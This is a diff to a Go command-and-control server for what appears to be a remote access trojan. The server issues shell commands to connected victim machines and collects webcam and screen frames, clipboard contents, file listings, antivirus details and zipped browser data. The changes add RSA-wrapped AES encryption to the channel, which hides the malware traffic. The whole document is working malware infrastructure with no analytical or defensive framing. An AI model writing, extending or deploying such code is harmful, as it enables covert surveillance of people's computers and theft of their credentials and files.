@@ -2,12 +2,19 @@ package main
 
 import (
 	"bufio"
+	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
+	crand "crypto/rand"
+	"crypto/rsa"
+	"crypto/x509"
 	"encoding/base64"
 	"encoding/json"
+	"encoding/pem"
 	"fmt"
 	"html/template"
 	"log"
-	"math/rand"
+	mrand "math/rand"
 	"net"
 	"net/http"
 	"os"
@@ -21,7 +28,31 @@ import (
 var (
 	tcpListener   net.Listener
 	tcpListenerMu sync.Mutex
+	rsaPrivKey    *rsa.PrivateKey
 )
+
+func loadRSAPrivateKey() {
+	data, err := os.ReadFile("json/private.pem")
+	if err != nil {
+		log.Printf("RSA private key not found, generating one for this session...")
+		// Generate if not found, though we just created it in the plan
+		priv, err := rsa.GenerateKey(crand.Reader, 2048)
+		if err != nil {
+			log.Fatal(err)
+		}
+		rsaPrivKey = priv
+		return
+	}
+	block, _ := pem.Decode(data)
+	if block == nil {
+		log.Fatal("failed to parse PEM block containing the key")
+	}
+	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
+	if err != nil {
+		log.Fatal(err)
+	}
+	rsaPrivKey = priv
+}
 
 // ─── Config ───────────────────────────────────────────────
 type Config struct {
@@ -55,12 +86,86 @@ func saveConfig() error {
 const idChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 func generateID() string {
-	r := rand.New(rand.NewSource(time.Now().UnixNano()))
+	r := mrand.New(mrand.NewSource(time.Now().UnixNano()))
 	b := make([]byte, 8)
 	for i := range b {
 		b[i] = idChars[r.Intn(len(idChars))]
 	}
 	return string(b)
+}
+
+// ─── Messaging Structures ─────────────────────────────────
+type Packet struct {
+	Data string `json:"data"` // base64 encrypted JSON message
+	IV   string `json:"iv"`   // base64 IV
+}
+
+type Message struct {
+	Type    string `json:"type"`
+	Payload string `json:"payload"`
+}
+
+type Handshake struct {
+	Session string `json:"session"` // base64(rsa_encrypt(aes_key + iv))
+}
+
+// ─── Crypto Helpers ───────────────────────────────────────
+
+func aesEncrypt(plainText []byte, key, iv []byte) (string, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return "", err
+	}
+
+	// Padding
+	padding := aes.BlockSize - len(plainText)%aes.BlockSize
+	padText := bytes.Repeat([]byte{byte(padding)}, padding)
+	plainText = append(plainText, padText...)
+
+	cipherText := make([]byte, len(plainText))
+	mode := cipher.NewCBCEncrypter(block, iv)
+	mode.CryptBlocks(cipherText, plainText)
+
+	return base64.StdEncoding.EncodeToString(cipherText), nil
+}
+
+func aesDecrypt(cipherTextB64 string, key, iv []byte) ([]byte, error) {
+	cipherText, err := base64.StdEncoding.DecodeString(cipherTextB64)
+	if err != nil {
+		return nil, err
+	}
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+
+	if len(cipherText)%aes.BlockSize != 0 {
+		return nil, fmt.Errorf("ciphertext is not a multiple of the block size")
+	}
+
+	mode := cipher.NewCBCDecrypter(block, iv)
+	mode.CryptBlocks(cipherText, cipherText)
+
+	// Unpadding
+	length := len(cipherText)
+	if length == 0 {
+		return nil, fmt.Errorf("decrypted text is empty")
+	}
+	unpadding := int(cipherText[length-1])
+	if unpadding > length || unpadding > aes.BlockSize {
+		return nil, fmt.Errorf("invalid padding")
+	}
+
+	return cipherText[:(length - unpadding)], nil
+}
+
+func rsaDecrypt(encryptedB64 string) ([]byte, error) {
+	data, err := base64.StdEncoding.DecodeString(encryptedB64)
+	if err != nil {
+		return nil, err
+	}
+	return rsa.DecryptPKCS1v15(crand.Reader, rsaPrivKey, data)
 }
 
 // ─── Shell Output Buffer ──────────────────────────────────
@@ -127,6 +232,9 @@ type Client struct {
 	// Settings
 	Nickname string
 	Note     string
+	// Crypto
+	aesKey []byte
+	aesIV  []byte
 }
 
 func (c *Client) updatePong() {
@@ -224,13 +332,37 @@ func getClientByID(id string) *Client {
 	return nil
 }
 
+func sendEncrypted(c *Client, msg Message) error {
+	payload, err := json.Marshal(msg)
+	if err != nil {
+		return err
+	}
+
+	encrypted, err := aesEncrypt(payload, c.aesKey, c.aesIV)
+	if err != nil {
+		return err
+	}
+
+	packet := Packet{
+		Data: encrypted,
+		IV:   base64.StdEncoding.EncodeToString(c.aesIV),
+	}
+
+	packetJSON, err := json.Marshal(packet)
+	if err != nil {
+		return err
+	}
+
+	_, err = fmt.Fprintf(c.conn, "%s\n", string(packetJSON))
+	return err
+}
+
 func sendCommandByID(id, cmd string) error {
 	clientsMu.Lock()
 	defer clientsMu.Unlock()
 	for _, c := range clients {
 		if c.ID == id {
-			_, err := fmt.Fprintf(c.conn, cmd+"\n")
-			return err
+			return sendEncrypted(c, Message{Type: "command", Payload: cmd})
 		}
 	}
 	return fmt.Errorf("client bulunamadı: %s", id)
@@ -240,7 +372,7 @@ func broadcast(cmd string) {
 	clientsMu.Lock()
 	defer clientsMu.Unlock()
 	for _, c := range clients {
-		fmt.Fprintf(c.conn, cmd+"\n")
+		sendEncrypted(c, Message{Type: "command", Payload: cmd})
 	}
 }
 
@@ -349,9 +481,33 @@ func restartTCPServer(newPort string) error {
 }
 
 func handleTCPClient(conn net.Conn) {
+	scanner := bufio.NewScanner(conn)
+	// Büyük dosya transferleri için buffer boyutu: 150 MB
+	const maxScanBuf = 150 * 1024 * 1024
+	scanner.Buffer(make([]byte, 64*1024), maxScanBuf)
+
+	// 1. Handshake bekle
+	if !scanner.Scan() {
+		conn.Close()
+		return
+	}
+	var hs Handshake
+	if err := json.Unmarshal(scanner.Bytes(), &hs); err != nil {
+		log.Printf("[TCP] Geçersiz handshake: %v", err)
+		conn.Close()
+		return
+	}
+
+	sessionData, err := rsaDecrypt(hs.Session)
+	if err != nil || len(sessionData) != 48 {
+		log.Printf("[TCP] RSA decrypt hatası veya geçersiz session verisi")
+		conn.Close()
+		return
+	}
+
 	id := generateID()
 	ip := conn.RemoteAddr().String()
-	log.Printf("[TCP] Bağlandı: %s (ID: %s)", ip, id)
+	log.Printf("[TCP] Bağlandı (Şifreli): %s (ID: %s)", ip, id)
 
 	client := &Client{
 		ID:          id,
@@ -359,6 +515,8 @@ func handleTCPClient(conn net.Conn) {
 		ConnectedAt: time.Now().Format("02.01.2006 15:04:05"),
 		conn:        conn,
 		lastPong:    time.Now(),
+		aesKey:      sessionData[:32],
+		aesIV:       sessionData[32:],
 	}
 	addClient(client)
 
@@ -377,167 +535,153 @@ func handleTCPClient(conn net.Conn) {
 				conn.Close()
 				return
 			}
-			if _, err := fmt.Fprintf(conn, "ping\n"); err != nil {
+			if err := sendEncrypted(client, Message{Type: "ping"}); err != nil {
 				return
 			}
 		}
 	}()
 
-	scanner := bufio.NewScanner(conn)
-	// Büyük dosya transferleri için buffer boyutu:
-	// filebrowser.rs MAX_DOWNLOAD_BYTES = 50MB → base64 encode → ~67MB tek satır
-	// browser zip transferleri de büyük olabilir
-	const maxScanBuf = 150 * 1024 * 1024 // Max line size: 150 MB
-	// Use a small initial buffer (64KB) but allow it to grow up to maxScanBuf.
-	// This prevents immediate pre-allocation of 150MB per client.
-	scanner.Buffer(make([]byte, 64*1024), maxScanBuf)
-
 	for scanner.Scan() {
 		line := scanner.Text()
-		switch {
-		case line == "pong":
+		var packet Packet
+		if err := json.Unmarshal([]byte(line), &packet); err != nil {
+			log.Printf("[TCP][%s] JSON parse hatası: %v", id, err)
+			continue
+		}
+
+		packetIV, err := base64.StdEncoding.DecodeString(packet.IV)
+		if err != nil {
+			log.Printf("[TCP][%s] IV decode hatası", id)
+			continue
+		}
+
+		decrypted, err := aesDecrypt(packet.Data, client.aesKey, packetIV)
+		if err != nil {
+			log.Printf("[TCP][%s] Deşifre hatası: %v", id, err)
+			continue
+		}
+
+		var msg Message
+		if err := json.Unmarshal(decrypted, &msg); err != nil {
+			log.Printf("[TCP][%s] Message JSON hatası: %v", id, err)
+			continue
+		}
+
+		switch msg.Type {
+		case "pong":
 			client.updatePong()
 
-		case strings.HasPrefix(line, "[ps_output]"):
-			data := strings.TrimPrefix(line, "[ps_output]")
-			client.addOutput("ps", data)
+		case "response":
+			payload := msg.Payload
+			switch {
+			case strings.HasPrefix(payload, "[ps_output]"):
+				data := strings.TrimPrefix(payload, "[ps_output]")
+				client.addOutput("ps", data)
 
-		case strings.HasPrefix(line, "[cmd_output]"):
-			data := strings.TrimPrefix(line, "[cmd_output]")
-			client.addOutput("cmd", data)
+			case strings.HasPrefix(payload, "[cmd_output]"):
+				data := strings.TrimPrefix(payload, "[cmd_output]")
+				client.addOutput("cmd", data)
 
-		case strings.HasPrefix(line, "[cam_frame]"):
-			data := strings.TrimPrefix(line, "[cam_frame]")
-			client.mu.Lock()
-			client.LastCamFrame = data
-			client.mu.Unlock()
-
-		case strings.HasPrefix(line, "[screen_frame]"):
-			data := strings.TrimPrefix(line, "[screen_frame]")
-			client.mu.Lock()
-			client.LastFrame = data
-			client.mu.Unlock()
-
-		case strings.HasPrefix(line, "[sysinfo]"):
-			data := strings.TrimPrefix(line, "[sysinfo]")
-			// Protokol: WinVersion|DesktopName|AntiVirus|Country|GPU|CPU|RAM|Disk|ProcessName
-			parts := strings.Split(data, "|")
-			client.mu.Lock()
-			if len(parts) >= 1 { client.WinVersion  = parts[0] }
-			if len(parts) >= 2 { client.DesktopName = parts[1] }
-			if len(parts) >= 3 { client.AntiVirus   = parts[2] }
-			if len(parts) >= 4 { client.Country     = parts[3] }
-			if len(parts) >= 5 { client.GPU         = parts[4] }
-			if len(parts) >= 6 { client.CPU         = parts[5] }
-			if len(parts) >= 7 { client.RAM         = parts[6] }
-			if len(parts) >= 8 { client.Disk        = parts[7] }
-			if len(parts) >= 9 { client.ProcessName = parts[8] }
-			client.mu.Unlock()
-			log.Printf("[Sysinfo][%s] win=%s desktop=%s av=%s country=%s gpu=%s cpu=%s ram=%s disk=%s proc=%s",
-				id, client.WinVersion, client.DesktopName, client.AntiVirus, client.Country,
-				client.GPU, client.CPU, client.RAM, client.Disk, client.ProcessName)
-
-		case strings.HasPrefix(line, "[tasklist_result]"):
-			data := strings.TrimPrefix(line, "[tasklist_result]")
-			client.mu.Lock()
-			client.LastTasklist = data
-			client.TasklistReady = true
-			client.mu.Unlock()
-
-		case strings.HasPrefix(line, "[taskkill_result]"):
-			data := strings.TrimPrefix(line, "[taskkill_result]")
-			client.mu.Lock()
-			client.LastKillResult = data
-			client.mu.Unlock()
-
-		case strings.HasPrefix(line, "[rfe_result]"):
-			data := strings.TrimPrefix(line, "[rfe_result]")
-			client.mu.Lock()
-			client.RFEResult = data
-			client.RFEReady  = true
-			client.mu.Unlock()
-
-		// ── Browser zip transferi ──────────────────────────────────────────────
-		// Protokol: [browser_zip]<zip_adi>|<base64_zip_bytes>
-		// Örn:      [browser_zip]Edge_extract.zip|UEsDB...
-		case strings.HasPrefix(line, "[browser_zip]"):
-			payload := strings.TrimPrefix(line, "[browser_zip]")
-			sep := strings.IndexByte(payload, '|')
-			if sep < 0 {
-				log.Printf("[Browser][%s] Geçersiz browser_zip formatı (| yok)", id)
+			case strings.HasPrefix(payload, "[cam_frame]"):
+				data := strings.TrimPrefix(payload, "[cam_frame]")
 				client.mu.Lock()
-				client.BrowserErrMsg  = "geçersiz zip paketi formatı"
-				client.BrowserReady   = true
+				client.LastCamFrame = data
 				client.mu.Unlock()
-				break
-			}
-			zipName := payload[:sep]
-			b64Data := payload[sep+1:]
-			zipBytes, err := base64.StdEncoding.DecodeString(b64Data)
-			if err != nil {
-				log.Printf("[Browser][%s] Base64 decode hatası: %v", id, err)
+
+			case strings.HasPrefix(payload, "[screen_frame]"):
+				data := strings.TrimPrefix(payload, "[screen_frame]")
 				client.mu.Lock()
-				client.BrowserErrMsg  = "base64 decode hatası: " + err.Error()
-				client.BrowserReady   = true
+				client.LastFrame = data
 				client.mu.Unlock()
-				break
-			}
-			log.Printf("[Browser][%s] Zip alındı: %s (%d bytes)", id, zipName, len(zipBytes))
-			client.mu.Lock()
-			client.BrowserZipName  = zipName
-			client.BrowserZipBytes = zipBytes
-			client.BrowserErrMsg   = ""
-			client.BrowserReady    = true
-			client.mu.Unlock()
 
-		// ── Browser hata mesajı ───────────────────────────────────────────────
-		case strings.HasPrefix(line, "[browser_zip_err]"):
-			errMsg := strings.TrimPrefix(line, "[browser_zip_err]")
-			log.Printf("[Browser][%s] Hata: %s", id, errMsg)
-			client.mu.Lock()
-			client.BrowserErrMsg   = errMsg
-			client.BrowserZipBytes = nil
-			client.BrowserZipName  = ""
-			client.BrowserReady    = true
-			client.mu.Unlock()
+			case strings.HasPrefix(payload, "[sysinfo]"):
+				data := strings.TrimPrefix(payload, "[sysinfo]")
+				parts := strings.Split(data, "|")
+				client.mu.Lock()
+				if len(parts) >= 1 { client.WinVersion  = parts[0] }
+				if len(parts) >= 2 { client.DesktopName = parts[1] }
+				if len(parts) >= 3 { client.AntiVirus   = parts[2] }
+				if len(parts) >= 4 { client.Country     = parts[3] }
+				if len(parts) >= 5 { client.GPU         = parts[4] }
+				if len(parts) >= 6 { client.CPU         = parts[5] }
+				if len(parts) >= 7 { client.RAM         = parts[6] }
+				if len(parts) >= 8 { client.Disk        = parts[7] }
+				if len(parts) >= 9 { client.ProcessName = parts[8] }
+				client.mu.Unlock()
+				log.Printf("[Sysinfo][%s] win=%s desktop=%s country=%s", id, client.WinVersion, client.DesktopName, client.Country)
 
-		case strings.HasPrefix(line, "[clipboard_result]"):
-			data := strings.TrimPrefix(line, "[clipboard_result]")
-			client.mu.Lock()
-			client.ClipboardResult = data
-			client.ClipboardReady  = true
-			client.mu.Unlock()
+			case strings.HasPrefix(payload, "[tasklist_result]"):
+				data := strings.TrimPrefix(payload, "[tasklist_result]")
+				client.mu.Lock()
+				client.LastTasklist = data
+				client.TasklistReady = true
+				client.mu.Unlock()
 
-		case strings.HasPrefix(line, "[clipboard_set_result]"):
-			data := strings.TrimPrefix(line, "[clipboard_set_result]")
-			client.mu.Lock()
-			client.ClipboardSetResult = data
-			client.ClipboardSetReady  = true
-			client.mu.Unlock()
+			case strings.HasPrefix(payload, "[taskkill_result]"):
+				data := strings.TrimPrefix(payload, "[taskkill_result]")
+				client.mu.Lock()
+				client.LastKillResult = data
+				client.mu.Unlock()
 
-		case strings.HasPrefix(line, "[ls_result]"),
-			strings.HasPrefix(line, "[download_result]"),
-			strings.HasPrefix(line, "[delete_result]"),
-			strings.HasPrefix(line, "[mkdir_result]"),
-			strings.HasPrefix(line, "[upload_result]"),
-			strings.HasPrefix(line, "[rename_result]"):
-			// hangi prefix olduğunu bul
-			var kind, data string
-			for _, pfx := range []string{"[ls_result]","[download_result]","[delete_result]","[mkdir_result]","[upload_result]","[rename_result]"} {
-				if strings.HasPrefix(line, pfx) {
-					kind = strings.TrimPrefix(strings.TrimSuffix(pfx, "]"), "[")
-					data = strings.TrimPrefix(line, pfx)
-					break
+			case strings.HasPrefix(payload, "[rfe_result]"):
+				data := strings.TrimPrefix(payload, "[rfe_result]")
+				client.mu.Lock()
+				client.RFEResult = data
+				client.RFEReady  = true
+				client.mu.Unlock()
+
+			case strings.HasPrefix(payload, "[browser_zip]"):
+				p := strings.TrimPrefix(payload, "[browser_zip]")
+				sep := strings.IndexByte(p, '|')
+				if sep >= 0 {
+					zipName := p[:sep]
+					b64Data := p[sep+1:]
+					zipBytes, _ := base64.StdEncoding.DecodeString(b64Data)
+					client.mu.Lock()
+					client.BrowserZipName  = zipName
+					client.BrowserZipBytes = zipBytes
+					client.BrowserReady    = true
+					client.mu.Unlock()
+				}
+
+			case strings.HasPrefix(payload, "[browser_zip_err]"):
+				errMsg := strings.TrimPrefix(payload, "[browser_zip_err]")
+				client.mu.Lock()
+				client.BrowserErrMsg = errMsg
+				client.BrowserReady  = true
+				client.mu.Unlock()
+
+			case strings.HasPrefix(payload, "[clipboard_result]"):
+				data := strings.TrimPrefix(payload, "[clipboard_result]")
+				client.mu.Lock()
+				client.ClipboardResult = data
+				client.ClipboardReady  = true
+				client.mu.Unlock()
+
+			case strings.HasPrefix(payload, "[clipboard_set_result]"):
+				data := strings.TrimPrefix(payload, "[clipboard_set_result]")
+				client.mu.Lock()
+				client.ClipboardSetResult = data
+				client.ClipboardSetReady  = true
+				client.mu.Unlock()
+
+			case strings.Contains(payload, "_result]"):
+				var kind, data string
+				for _, pfx := range []string{"[ls_result]","[download_result]","[delete_result]","[mkdir_result]","[upload_result]","[rename_result]"} {
+					if strings.HasPrefix(payload, pfx) {
+						kind = strings.TrimPrefix(strings.TrimSuffix(pfx, "]"), "[")
+						data = strings.TrimPrefix(payload, pfx)
+						break
+					}
+				}
+				if kind != "" {
+					client.mu.Lock()
+					client.FBResult = data
+					client.FBKind   = kind
+					client.FBReady  = true
+					client.mu.Unlock()
 				}
 			}
-			client.mu.Lock()
-			client.FBResult = data
-			client.FBKind   = kind
-			client.FBReady  = true
-			client.mu.Unlock()
-
-		default:
-			log.Printf("[TCP][%s][%s] → %s", id, ip, line)
 		}
 	}
 }
@@ -1368,6 +1512,7 @@ func logoutHandler(w http.ResponseWriter, r *http.Request) {
 // ─── Main ─────────────────────────────────────────────────
 func main() {
 	loadConfig()
+	loadRSAPrivateKey()
 
 	go startTCPServer()
 
